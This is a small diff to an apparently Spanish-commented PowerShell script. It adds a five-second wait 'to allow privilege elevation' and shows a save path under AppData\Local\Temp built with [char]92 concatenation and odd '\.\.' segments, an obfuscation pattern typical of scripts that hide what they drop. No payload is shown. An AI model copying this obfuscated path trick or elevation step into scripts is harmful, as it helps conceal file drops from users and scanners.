@@ -1,3 +1,6 @@
+# Esperar unos segundos para permitir la elevación de privilegios
+Start-Sleep -Seconds 5
+
 # Ruta predeterminada donde se guardará el script
 $ScriptDirectory = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data"
 
